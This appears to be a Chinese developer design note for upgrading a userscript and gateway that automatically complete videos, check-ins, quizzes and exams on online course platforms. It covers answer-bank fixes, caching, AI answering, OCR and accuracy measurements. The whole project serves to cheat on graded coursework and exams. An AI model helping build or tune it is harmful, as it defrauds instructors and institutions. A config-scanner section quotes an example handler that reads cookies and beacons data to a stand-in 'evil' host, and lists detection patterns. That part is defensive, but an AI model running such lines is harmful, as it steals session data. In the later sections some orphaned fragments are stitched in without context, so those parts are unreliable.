# OCS 脚本升级方案

> 基于官方脚本 **OCS 网课助手 v5.4.0**（26004 行，987.7 KB）实测调研
> 日期：2026-11-10

---

## 一、先说结论

**「升级 ocs.user.js」不该理解为改官方脚本。**

官方 v5.4.0 是 esbuild 打包产物，26004 行里大半是打包器运行时，改不动也不该改。
正确路径是 **官方脚本（管平台覆盖） + 我们的网关（管答案正确性）** —— 这也正是我们在走的路。

好消息：**接口层面已经对齐了**。你不用改官方脚本一行代码。

## 二、官方脚本强在哪、弱在哪

### 强：平台覆盖广 + 题库配置生态

| 能力 | 说明 |
|---|---|
| 平台覆盖 | 学习通 / 中国大学MOOC / 智慧树 / 超星尔雅 / 智慧职教 / 融通 / 云课堂 等 20+ 域名 |
| 任务类型 | 视频、阅读、签到、答题、考试、章节作业 |
| 题库生态 | answerer wrapper 协议、TikuAdapter、本地题库缓存、配置风险扫描 |
| 答题策略 | 顺序答题、随机作答、提交率控制 |

### 弱：答案正确性全靠题库

这是官方脚本真正的短板，也是我们网关补上的那一半。

## 三、官方脚本的五个真问题

### ① 缓存按标题字符串匹配，答案存的是字母 ★最严重

`findInLocalQuestionCaches`（10119-10130）：

```js
if (cache.title.trim() === title.trim())   // 纯字符串相等
```

缓存里存的是 `{title, answer}`，`answer` 是**当时的字母**。

**而 OCS 每次出卷都会重排选项。** 我实测过 135 道题：

| 现象 | 数量 |
|---|---|
| 跨会话选项顺序变了 | 46 / 135 |
| 答案**字母**变了 | 190 次 |
| 连答案**内容**都变了 | 36 例 |

所以缓存命中后返回的是上一次的字母 —— **直接指到另一个选项**。

> 我们的网关按 (题干 + 选项内容 + 图片哈希) 存缓存，不受重排影响。

### ② 答案匹配最终退化成「按字母选第 N 个选项」

`resolveSingle` 最后一步（4117-4120）：

```js
charCodeAt(0) - 65   // 直接当下标用
```

`resolveMultiple` 同理。**只要题库返回的是字母，官方就完全不做内容核对** —— 选项一重排就必然错。

> 我们按**选项内容**映射（`translate_answer`），映射不上就返回 None 而不是猜一个。

### ③ 把答案字母当成「它在答案串里的位置」而不是「它的值」

这一条跟 ② 是同一个错误的两种表现，但值得单列 —— **它极难被发现**，
因为在「答案恰好只有一个字母」时两者结果完全一样，多一个字母才暴露。

```js
// ✗ 错：把字母在字符串中的下标当成选项下标
"AC".indexOf("A")   // → 0   对了
"AC".indexOf("C")   // → 1   错！C 应该是第 3 个选项（index 2）

// ✓ 对：字母的值才是选项下标
"ABCDEFGHIJKLMNOPQRSTUVWXYZ".indexOf("C")   // → 2
```

多选里这个错尤其致命：`"AC"` 在正解里是 A 和 C 两个选项，在错解里变成 A 和 B —— **答案看着合法，却完全选错**。

**我们自己就踩过这个坑**：写核对脚本时用了
`{nz(o[i]) for i, ch in enumerate(answer_str) if ch in L}`，
结果 45 条官方记录被判成「答案与快照真值不符」—— 逐条手工核对才发现**全是对的**。
换成 `L.index(ch)` 之后，不符数归零。

> 教训：核对「答案是否指向正确选项」别自己写比对脚本，用项目里已有的
> `scripts/verify_official_answers.py`（按语义核对，不看字母位置）。

### ④ 那条黄条告警，触发条件写反了

```js
// 14243
info = result.finish ? null
     : result.resolved === false ? "等待顺序答题中…⏱️"
     : lib.h("div", {className: "result-info warn"}, mismatchText);
```

文案是「⚠️ 给出的答案和选项不匹配，可能是题库答案错误」，但：

- 真正「算出来但对不上」时 `finish` 是 true → `info = null` → **什么都不显示**
- 它只在「**根本没解析出答案**」时才显示

**名不副实** —— 文案写的是"答案错了"，实际含义是"没搜到答案"。

> 我们加了 `mismatch` 字段，把三种情况分开报（见下面第四节）。

### ⑤ 没有任何重试或退避

`defaultAnswerWrapperHandler`（4388-4509）用 `Promise.race([request(...), sleep(60s)])`，超时直接抛错，**不重试**。

一题最多卡 70 秒（`waitForRequested` 另设 `(timeout+10)*1000`）；整卷 10 题、`thread=1` 时最坏 700 秒。

> 我们有多 provider 轮换 + 多模型投票 + `_singleflight` 同题并发合并。

### 附一：回流时只存答案字母、不存选项顺序 ★我们自己也踩过

这一条官方脚本没有（它不维护题库），但**我们自己的网关踩过，而且踩得很典型**：

单选/多选的答案是「字母」，只有放进**当时的选项顺序**里才有意义。而 OCS 同一道题换场次会换顺序 —— 只写字母、不写顺序，字母就指向了另一个选项。

**症状极具辨识度**：题库看着「有官方答案」，实际给出去的是错的；而且**错的全都是单选**，判断题和填空题都对（判断题存语义词、填空题存原文，都不受换序影响）。

修复：写答案时把 `options` 一并写入，字母与顺序永远自洽。
另外补了 `scripts/fix_stale_letters.py`，用快照真值回填存量陈旧字母（实测命中 2 条，复跑归零）。

> 交叉验证：436 个快照、现行库里字母答案与真值 —— **126 条对、2 条"错"**。
> 那 2 条我逐条看了，不是错答案：一条库里存文字版、快照存图片版，同一道题的两种表示。

### 附二：官方没有「同一道题的不同表示形式」这层对齐

这条不是官方的 bug，是**我们自己要解决的问题** —— 而官方压根不需要面对它。

同一道题，在不同来源里长得不一样：

| 来源 | 题干形态 |
|---|---|
| OCS 答题页 | LaTeX 文本 / 完整图片 URL |
| 结果页（早期版本） | 图片被抹成 `( )` |
| 题库导出 | 文字描述 |
| OCR 索引 | 图片的转写文本 |

我们得让这四种**认出是同一道题**，否则会出这种事：

> 一道题，官方答案是 **B**，另一条 AI 记录是 **C**（错）。
> 官方那条的题干里图被压成了 `( )`，匹配不上带图的请求 → 官方答案被跳过 → 错的 C 顶上来。
> 用户看到的是「AI 猜错了」，真正原因却是「官方答案根本没被找到」。

我们的对齐手段：`text_key`（文字骨架）+ `same_question_truncated`（骨架前缀 + 图片 URL 序列前缀）
+ `canon_text`（URL→OCR）+ `_norm_title_for_dedupe`（保留图片 URL 指纹）。

**这一层能力官方没有**：它的题库是外部的，格式由题库作者决定，它只管把答案填进选项。

### 附三：「题干被截到 300 字」—— 不是官方的问题，是我们自己的 ★已核实

我们早期在网关侧把请求题干截到 300 字再送给模型，导致公式图片题的题干
（常常 300~480 字）尾部被砍掉 —— 而尾部往往正是「则行列式…的值为」
这类决定答案的信息。

**这里要更正一个此前的错误归因**：我们一度把这事记在官方 OCS 头上。
2026-11-10 逐行核实后确认 —— **官方脚本没有这个行为**：

| 核实项 | 结果 |
|---|---|
| 官方 v5.4.0（`Downloads/ocs.user.js`）全文 `300` 字面量 | 只有 4 处，全是 `sleep(300)` 延时 |
| 浏览器里**实际安装**的 v5.3.1（从 Tampermonkey 存储里抽出来的真源码） | 同样只有 4 处 `sleep(300)` |
| `env.title` 的构造（两个版本都在 11880 / 11885 行附近） | `title: params.title` —— **原样传，无任何长度上限** |
| 全部 9 个 `titleTransform` 实现 | 逐个读过，**没有一处做长度截断** |
| 题干里唯一的长度上限 | `slice(0, 20)`（4715/4804 行），**只用于屏幕上显示题目标题**，不进请求 |
| 本地题库缓存的容量限制 | 是**字节数**上限（单条 64KB / 总共 1MB），不是字数 |

结论：**题干截断 300 字是我们网关自己的历史行为**，官方从头到尾没碰过题干长度。
这个更正很重要 —— 因为它把「责任」从「官方脚本的 bug」挪到了「我们自己的 bug」，
修法也就不同（改我们的截断逻辑 vs 没法改官方的打包产物）。

顺带一个发现：浏览器里装了另一个第三方扩展「**大学搜题酱插件**」，
它的 7 处 `slice(0,300)` 全在**错误堆栈、聊天消息、课程路径元数据**上，
不涉及题干正文 —— 也不是它干的。

> 实测数据佐证：`data/failures.json` 里题干**恰好 300 字**的记录只有 3 条，
> 且与 380 字版本的是**同一道题**（前三张图完全相同，第四张 URL 被切断成 `http://mooc-`）。
> 说明这是**按字数硬切**的特征，不是别的机制。

## 四、我们这轮已经做完的接口对齐

### 1. `POST /ocs/search` —— 官方脚本能直接吃我们的网关

官方 handler 契约要求返回 `[[question, answer, extra_data], ...]`（数组套数组），
不匹配就当"没搜到"。我们的 `/query` 返回 `{code, data}`，形状对不上。

新端点直接吐官方要的形状：

```json
[["初等矩阵是满秩矩阵","正确",{"answer":"正确","source":"official","match":"official","risk":false}]]
```

没搜到时返回 `[]`（官方才能正确显示「❌ 题库没搜索到答案」）。

**用法**：在 OCS 的题库配置里填 `http://127.0.0.1:8000/ocs/search`，handler 写 `res => res` 即可。

### 2. `POST /api/ocs/scan-config` —— 题库配置风险扫描

官方脚本的「题库」配置里 `handler` 是 `Function()` 动态构造、**以你的登录身份在课程页面上执行**的代码。
抄一份第三方的题库配置，等于让第三方的代码在你的账号上下文里跑。

官方为此在导入前做一次特征扫描，命中就弹窗让你确认。我们管理台同样能粘任意题库配置，补上了同一道防线：

```json
POST /api/ocs/scan-config
{"handler": "return (r)=>{document.cookie; navigator.sendBeacon('http://evil',r); return []}"}
→ {"risks":[{"id":"cookie",...},{"id":"beacon",...}],"count":2,"safe":false,
   "summary":"这份题库配置会在页面上执行以下操作：上报数据（sendBeacon / WebSocket）；读写 Cookie"}
```

扫 14 类特征：`eval` / `new Function` / `fetch` / `GM_xmlhttpRequest` / `cookie` /
`localStorage` / `sendBeacon` / `location` / `document.*` / `__proto__` /
`fromCharCode` / 动态属性访问 / `import()` / `postMessage`。

> **注**：官方把 `Function(` 列为危险特征，但我们自己的 handler 本身就是 `Function()` 构造的 ——
> 照抄会把自家配置也拦下来。所以我们不扫 `Function`，只扫 `eval` 和 `new Function`。

### 3. `mismatch` 分类字段 —— 准确的告警文案

`/query` 的 `data` 里所有出答案的路径（官方答案 / 本地题库 / AI / 缓存）都带上了：

| `mismatch.kind` | 含义 | OCS 侧建议文案 |
|---|---|---|
| `answer-not-in-options` | 答案字母指不到任何选项 | 题库答案可能过期了 |
| `invalid-format` | 答案格式不合法 | 答案格式不对 |
| `broken-options` | 选项本身坏（空项/重复项） | 这道题的选项有问题 |

### 4. 选项字母前缀剥离 —— 补上官方 `removeRedundant` 的能力

官方会剥掉 `A. ` / `B、` / `(C)` 这类前缀。我们原来不剥，
`"A. 北京"` 归一化成 `"a北京"`，跟 `"北京"` 对不上 —— 同一道题在答题页和题库里成了两条记录。

### 5. 嵌套 LaTeX 分数展开

我们原来只处理单层 `\cmd{arg}`，`\frac{1}{\frac{2}{3}}` 展不开。
现在按官方思路循环替换直到收敛。

## 六、还没做的（等你拍板）

### A. 多空填空题的答案格式

官方按 `["===", "#", "---", "###", "|", ";", "；"]` 切分答案，按 DOM 里 textarea 的数量填进各个空。

**我们库里 155 条填空题答案没有一条含分隔符** —— 所以现在没有多空题会被填错（也没有多空题的数据）。
但一旦 OCS 侧遇到多空题，就会只填第一个空。

**2026-11-10 逐题核过 DOM，确认「没有多空题」是事实而非巧合**：
快照里 **1028 道填空题，每道恰好 1 个 `<textarea>`**（`inputtxt` 在每道题里出现 3 次，
但那是分数/空数字段，不是输入框）。题干里的 `__ _ _______` 是**一个空**的
混合下划线渲染（`__` + `<span style="text-decoration:underline"> _</span>` + `_______`），
**不是三个空** —— 别被下划线数量骗了。

建议：**先不动**，等真有多空题数据再定格式（我倾向用 `|` 分隔 + 网关侧 `_parse_completion` 支持切分）。

### B. 图片占位符往返协议

官方把题干里的图片 URL 换成 `[图片N]` 占位符，再把 base64 塞进 `env.images`；
答案回来时再把 `[图片N]` 换回 URL。

我们现在是直接把 base64 数组喂给模型 —— **能工作**，但占位符能省 token。

建议：**等有实测痛点再动**（协议级改动）。

### C. `userscript/ocs-progress.user.js`（只读进度上报）

这个脚本是只读的（不答题、不提交），跟答题链路无关。
要不要也升级（比如加错题本同步、成绩回传），取决于你用不用它。

## 附：本轮题库事故与恢复（背景）

调研期间发现题库从 1224 条掉到 777 条，已修复：

**根因**：`Bank.dedupe_near()` 判重时把题干里的公式图片 URL 归一化成 `http//edu-ima` 残片，
导致**文字相同、公式图不同**的不同题被判成同一道题，`_merge_groups()` 里 `self.delete()` 真删。

实测复现：影子库跑一轮 `dedupe_near(3, dry_run=False)` → 1224 变 924，删 300 条，
**这 300 条 100% 是真实丢失集合的子集**。

**已修**：判重改用保留图片 URL 指纹的归一化；含图片的题只有选项内容完全一致才允许合并；
`Bank._load()` 不再用陈旧 json 覆盖坏库；新增 `is_readable()` 区分空库与坏库；
破坏性脚本改双开关（`--dedupe --yes`）。

**恢复**：从完好备份 + 自动备份 + 结果页快照三源合并重建，再按快照真值清洗，
最终 **1232 条**（official 601，FTS 1232，integrity ok）。

**顺带修的**：

1. 官方答案指向空选项的 69 条（选项是图片，入库时只存了 `["","","",""]`）
2. **陈旧答案字母** —— 单选/多选只存字母、不存选项顺序，OCS 一换序字母就指错选项。
   写答案时把 `options` 一并写入；另用 `scripts/fix_stale_letters.py` 按快照真值回填存量
   （实测命中 2 条，复跑归零）

### 题库结构 P1：`updated` / `origin` 两列（2026-11-10 完成）

两列都在 `BankDB` 的建表/迁移里加，旧库启动时自动 `ALTER TABLE` 并回填：

- **`updated`（最后修改时间）**：任何**真有变化**的写入都会刷新 —— `add`、`update`、
  `record_attempt`（重复作答同一答案且 via 未变不算修改）、`mark_wrong`、
  `remember_answer`。老记录没有信息可考，迁移时用 `created` 当下界。
- **`origin`（原始出处）**：**只在入库时定一次**，之后不随 `via` 变化。
  这是它和 `via` 的本质区别 —— `via` 会被每次作答覆盖（`record_attempt`），
  要追「这条最早从哪来」只能靠 `origin`。更新接口传入的 `origin` 会被丢弃。
- **迁移实测**：1272 行，`updated=0` 的行 **0 条**（全部回填成 `created`）；
  `origin` 非空 **249 条**（等于当时的 `via`），其余 1023 条老记录的 `via`
  本来就是空，`origin` 只能留空 —— **不编造出处**。
- **写入兜底**：`BankDB._row()` 对未归一化的原始行（迁移脚本直接 `replace_all`）
  也保证 `updated` 是数字、`origin` 回落到 `via`，不写 NULL。

回归：282 个测试全绿（新增 `tests/test_bank_provenance.py` 8 个：add 打时间戳、
update 刷新且不改 origin、origin 不可被更新接口改写、重复作答不刷新、
mark_wrong 刷新、SQLite 往返、旧库迁移回填）。

### 题库结构 P2：`canonical_id`（2026-11-10 完成）

同一道题在库里常有多条记录（官方 / 人工 / AI 各一份，不同批次又各一份）。
去重删数据风险高；P2 改成**只挂不删**：`questions.canonical_id` 指向同一道题里
保留优先级最高的那条，规范记录指向自己 —— `GROUP BY canonical_id` 就是整组。

口径（与 `dedupe` 的合并闸门完全一致）：

- 同题型 + 同「保留图片指纹的题干」+ 同选项集；
- 题干图片 URL 不同 = 两道题（`_norm_title_for_dedupe` 保留 URL 指纹）；
- 跨多个具体专业不挂；答案冲突且没有唯一官方答案不挂；图片选项指纹不一致不挂。

规范记录按 `_rank_item` 选：官方 > 人工/导入 > 校准 > AI，已采纳 > 待确认，
有答案 > 无答案，具体专业 > 默认，同分取更早的（再同则按 id 定序，保证可重复）。

刷新时机：`Bank` 加载时算一次，之后每次落盘前重算（来源/状态/答案变化都会
影响谁是规范记录）。分组键按题面做了缓存，1272 条时重算从 **~31ms 降到 ~6ms**。

线上实测（`scripts/backfill_canonical_id.py`）：1272 条 → **937 条规范记录、
335 条挂在别人下、283 个重复组、最大组 5 条**；48 个候选组被闸门拦下（不挂）；
`canonical_id` 空值 0、悬空引用 0。

> 这是**标注列**，不改任何匹配/答题行为。后续可以用它做组内投票、冲突归并，
> 或让接口只返回规范记录；现在先把关系攒对。

回归：290 个测试全绿（新增 `tests/test_bank_canonical.py` 8 个：AI 挂官方、
更优记录后来居上、答案冲突有/无官方裁决、不同图片 URL、不同 `image_hash`、
跨专业、SQLite 往返）。

### 题库结构 P3：`options_norm` / `answer_norm`（2026-11-10 完成）

单选/多选的答案是**字母**，只有对照「入库时的选项顺序」才有意义（见附一）。
库里的 `options` 与答案一起存，静态下自洽，但还剩两个洞：

1. **更新接口换选项时答案不跟着走**：管理员改了选项顺序、没改答案，同一个字母
   就静默指向了另一个选项 —— 这是「按字母存答案」最后一处会答错的入口；
2. **答案比较按字母串**：同一内容因选项换序存成不同字母，去重/规范分组会当成
   「答案冲突」，把本该合并的记录挡在门外。

P3 加两列**派生列**（口径见 `app/bank.py::_options_norm_list` / `_answer_semantic`）：

- **`options_norm`**：与 `options` **同序**的规范化内容（JSON 数组）。`_norm_option`
  负责剥 `A.` 前缀、压平全角符号、判断题的 对/√ → 正确/错误；
- **`answer_norm`**：与选项顺序**无关**的答案语义 —— 单选/多选是所选选项的规范化
  内容（排序后 `#` 连接），判断题是 正确/错误（字母按位置换算），填空是答案原文。
  字母越界/指向空选项时为空串（**不可解释**）—— 绝不退回字母，那正是换序后会
  指到别处的值。

写入侧：

- `Bank._normalize()` 从 `(type, options, answer)` 纯计算两列，和 `img_key` 一样
  不靠调用方记得传；
- `Bank.update()` 在「只改 options、没给 answer」时，用 `translate_answer` 把答案
  按内容翻译到新顺序；所选内容在新选项里**彻底消失**时，清空答案、`agree=0`、
  降为 pending + `conflict`（宁可说不知道，也不留一个指错的字母）；
- `translate_answer()` 现在也接受「内容形式」的答案（语义 → 目标选项字母），
  内容在目标选项里找不到就返回 None。

读取侧**不变**：对外仍是字母（OCS 契约）。`_canonical_linkable` / `_merge_groups`
改用 `_answer_key`（answer_norm 优先、缺失退回原文）比较答案。

**存量体检**（`scripts/backfill_options_norm.py`，1273 条）：

- 字母答案换算不出语义：**0 条**（没有越界/指向空选项的过期答案）；
- 判断题把答案存成字母：**0 条**（与之前的全库扫描一致，语义词才是正确形态）；
- canonical 组内语义答案不一致：**18 组** —— 都是真实的历史答案冲突（多为判断题
  答反），**只报告、不自动改写**：改答案是数据决策，脚本不越权；
- 语义比较对规范分组的影响：**0 组**。48 个被拦下的组是 24 个图片选项不一致 +
  24 个真实答案冲突，没有一组因「字母不同但语义相同」被误拦 —— 也就是说这列
  当前是**正确性保证**，不是数据修复的横财。

**18 组逐个核对（`scripts/check_canonical_conflicts.py`，442 个快照结果页）**：

### 官方空答案兜底（2026-11-10）

现场：填空题「6级排列 … 次邻换后变为 …」在 OCS 里显示「答案：无」且填不进去。
根因是库里 `cbfb06dd` 这条 `official / adopted` 记录的 `answer` 是空串，
而 `/query` 命中官方记录后把答案原样返回 —— 没有「空答案 → 按未命中处理」的分支。

修法在 `_resolve_core`，两处入口都要堵（只堵官方直查不够，`bank.match` 会把同一条
记录再返回一次）：

1. `find_official` 命中但答案为空 → `official = None`；
2. `bank.match`（含裸字母时的 `find_by_position`）命中、状态不是 pending、答案为空
   → `local = None`。**pending 记录保留**：它本来就等 AI 补答案，置空会绕开
   pending 累积流程、重复建记录。

兜底本身不改库：空答案记录保持原样，继续由「题库体检」的「官方空答案」指标暴露。
但走 AI 后，既有流程会照常把 AI 答案记入题库（`_remember` / pending 累积）。
实测 `cbfb06dd`：修复前返回 `answer="" / source=official`，修复后走 AI 返回
`15 / source=ai`（与当天线上页面标答一致），耗时 12.8s；该记录此前已被反馈流程
改成 pending，所以 AI 的 15 按 pending 流程记入（`agree=0`，未自动采纳）。
注意它的 `wrong_answers` 里有 `15`，自动采纳要求答案不在 `wrong_answers` 里 ——
这道题会一直 pending、每次重新问 AI，但每次都会答 15。
回归：`tests/test_gateway.py::ApiTests::test_empty_official_answer_falls_through_to_ai`，
307 个测试全绿。缺陷 ② 的另一半（导入的官方答案是**错的**、非空）与缺陷 ① 仍未动。

### hold-out 验证：99.3% 里有多少是「自己考自己」（2026-11-10）

补录的 38 条记录是从 46 条判断题用例的快照直接建的 —— 再拿同一批用例去测，
那 46 条必然 100%，属于训练集=测试集。这里把它们**整段剔除**再测一遍
（`scripts/verify_holdout.py`，用例身份判定与 `verify_e2e_accuracy.py` 完全一致）。

**划分口径**：补录只针对「真值不唯一」的 12 个判断题骨架，所以只要一条用例落在
这些骨架上（46 条）就算「被补录摸过」，不进 hold-out；其余 **665 条**是干净的。

| 组 | 用例 | 对 | 准确率 |
|---|---|---|---|
| **hold-out** | **665** | **616** | **92.6%** |
| 　completion | 88 | 45 | 51.1% |
| 　judge | 388 | 385 | 99.2% |
| 　multiple | 4 | 4 | 100% |
| 　single | 185 | 182 | 98.4% |
| 补录用例（in-sample，仅参考） | 46 | 46 | 100% |
| 全量（对照） | 711 | 662 | 93.1% |

结论：

1. **补录的效果全部落在它针对的那 46 条上**。hold-out 的判断题原本就是
   385/388（99.2%），补录前后一条没变 —— 旧的 95.6% 是被 12 个歧义骨架拖下来的，
   不是判断题整体不行。
2. **没有弄坏别的题**：同一批 665 条用例，用「补录前备份」与「补录后现库」
   分别跑题库直答（不走 AI），582/665 → 582/665，**救回 0、弄坏 0**。
3. **诚实的对外基线是 92.6%**（665 条 out-of-sample）。93.1% 的全量数字要注明
   含 46 条 in-sample，差值 +0.5pp 全部来自那 46 条。
4. 填空题仍是短板：hold-out 的 49 个错题里 **43 个**是填空（45/88 = 51.1%）。

补充观察：按「这道题在快照里出现几次」分组，只出现一次的题 135/144（93.8%），
跨快照重复的题 481/521（92.3%）—— 没有明显差别，成绩不是靠「背重复题」。

> 局限：hold-out 仍是**同一批快照语料**里的题，只是没被写进题库。它回答的是
> 「没为它写过记录时答得怎样」，不是「未来新题答得怎样」；后者需要补录之后
> 新抓的批次，目前没有。

无条件返回 4，`status=pending` 的官方记录在 `match()` 排序里会压过已采纳的
`calibrated`/`ai` 答案（好答案被挤掉，请求转去重问 AI，问不到就报错）。
现在 pending 官方算 2 级 —— 同级时 `adopted` 标志先胜出，所以已采纳答案能压过它，

实测验证：**1630/1630 一致**（`options[tt2字母]` vs 平台判分「你选对了/你选错了」推出的真值，
0 不一致）；DOM 顺序实测**恒为 `(A,B)`**（1760/1760），不存在显示字母与 DOM 顺序错位。

> **老师用图标写的选项内容**（A=✗、B=✓），**不是**「平台判分标记」——

> tt2 答案项的图标 ✓ 1018 / ✗ 612（**62.5%**，若为判分标记应 100%）；

### 图片 OCR 链路加固：失败状态机 + 原图资产库（2026-11-10）

上一节的「`known()` 7 天窗口」已被本节的失败状态机取代。`ImageTextStore`
现在把每条索引分成三种状态：

| 状态 | 含义 | 是否自动重试 |
|---|---|---|
| `ok` | 有非空 OCR 文本 | 不再跑 |
| `retryable` | 网络 / 429 / 5xx / 超时等临时失败 | 到 `next_retry_at` 后重试 |
| `permanent` | URL 无效、404/410、非图片内容、超过最大次数 | 永不自动重试 |

- 退避表 `RETRY_SCHEDULE = (60, 300, 1800, 7200, 43200, 86400)` 秒，
  `MAX_ATTEMPTS = 8`；`put_failed()` 只增不减 attempts，已有成功文本时拒绝覆盖。
- 旧格式 `failed=true` 条目在加载时迁移成「立即可重试」，由新一轮 OCR 重新分类。
- `known()` 只在 `ok`、`permanent`、或 `retryable` 且未到 `next_retry_at` 时返回 True；
  `retry_days` 只用于兼容没有 `status` 的旧条目。
- `is_actionable_url()` 直接判死被截断的伪地址（无点 host、空路径/查询），
  不再浪费请求。
- OCR 结果要过 `_valid_ocr_text()`：空串、纯标点、以及
  「图片未成功附上 / 无法识别 / 抱歉 / 信息不足」等元消息都按失败处理。
- 抓图失败按错误分类：404/410 永久；408/425/429/5xx 可重试；
  Content-Type 非图片永久；超时 / 连接错误可重试。

**原图资产库** `app/image_assets.py`：`ImageAssetStore` 把图片字节按
sha256 落到 `data/image_assets/`，`index.json` 记录 URL → sha256/路径/类型/大小。
`_ocr_image()` 先查本地资产，命中就直接重跑 OCR，不再依赖原 URL；抓取成功的新图
也会先入库。`GET /api/bank/image-coverage` 同时返回题库 URL 覆盖与
`store/assets` 统计（`assets.urls/present/bytes`）。

**备份 / 恢复**：`/api/backup` 会把 `data/image_assets/` 下的 `index.json`
和资产文件一起打进 zip（zip 内路径 `image_assets/...`）。恢复时只接受
`image_assets/index.json` 或 `image_assets/<64位sha256>.<ext>`，拒绝路径穿越；
写回后重新实例化 `ImageAssetStore`，老备份（不含 assets）仍可正常恢复。

**队列与索引**：
- `_formula_candidates()` = 题库 URL + `image_text.retryable_urls()`，
  清扫器和启动批次都会捡起**查询时出现过、但不在题库里**的失败图。
- 批量 OCR 前后都调用 `bank.set_image_text(image_text.mapping())`，
  新 OCR 文本立即进入 canonical 索引，不用等下一次导入。
- `/api/bank/import`、`/api/bank` 新增、`/api/bank/from-failure`、
  xlsx 导入、import-cache 都会自动 enqueue OCR。
- `_prepare_prompt()` 在把图片内联进 messages 后设置 `used_images = data_urls`，
  保证 `_ask_providers()` 的视觉路由真正生效（之前只按原始 images 判断，
  内联图可能被路由到非视觉模型）。
- 管理台状态文案改为「已索引 ok/total（待重试 retry，永久失败 permanent）」；
  只剩永久失败时按钮提示错误，不再假装还有队列。

**验证**：`tests/test_gateway.py` 329 项全绿，新增失败状态机、退避、
元消息过滤、原图资产复用、OCR 后重建索引、内联图视觉路由、资产备份 / 恢复

### 答题记忆系统：事件级 episode + 题目级记忆（2026-11-10 完成）

目标：题库/缓存没命中时，网关还能回答「这道题以前见过吗、谁答对过、错在哪」，
并把官方回流变成可复用的经验，而不是只改一条题库记录。

**存储**（`app/answer_memory.py`，`data/answer_memory.db`）
- `episodes`：每次真正返回答案都记一条（题型、题干指纹、选项指纹、图片指纹、
  答案、来源、provider、策略、置信度、风险、耗时、结果、重复次数）；
  同一题/答案/来源/模型/策略在 10 分钟内只累加 `repeat`，不放大样本。
- `question_memory`：每题一行的聚合视图（最佳答案、来源、置信度、历史错答及次数、
  正确/错误计数、状态 `observed/trusted/disputed`）。
- 指纹 = `sha256(qtype + text_key + options_key + img_key)`；图片题优先用请求
  base64 的 sha256，否则用题干/选项里的 URL 指纹。选项按内容排序/归一，
  字母答案召回前用 `bank.translate_answer` 按当前选项顺序重新翻译。

**信任边界**
- 只有 `official / feedback / paper / page / vote / manual` 确认过的答案允许
  `recall()` 直接返回；AI 自答但未确认的记忆只作为提示，不作为标准答案。
- `recall()` 先精确 qkey，再同 `qtype + text_key + options_key` 且图片身份严格一致的
  相似记忆；`strict_official` 模式跳过记忆召回。
- 填空题没有选项锚定，不做模糊提示（沿用「语义错配」的教训）。
- 否定词签名不同、选项指纹不同、图片身份不同都不互相提示；模糊提示文本相似度
  门槛 0.92，最多 2 条，每条最多 3 个历史错答。
- 反馈回流按官方答案逐条重算历史 episode 的 correct/wrong（不按调用方传入的
  `ok` 一刀切），官方答案变化时正确率随之修正；图片身份严格匹配，避免同题干
  不同图片的两道题共用答案。
- 衰减：非官方/人工的确认记忆按 180 天半衰期降置信度，低于 0.5 不再召回；
  未确认 episode 30 天清理、全部 episode 180 天清理、总量上限 5 万，启动时和
  每 6 小时滚动执行。

**接入**
- `_resolve()` 对每条成功返回记 episode；`_resolve_core()` 在题库 pending 判定后、

  恢复前关连接并移走旧 WAL），旧备份不含该文件也能正常恢复。
- 新接口：`GET /api/memory/stats|search|timeline`、`POST /api/memory/forget|prune`；

### 答题页隐藏答案污染（填空题错答 / 回滚后冲突仍在）— 2026-11-10
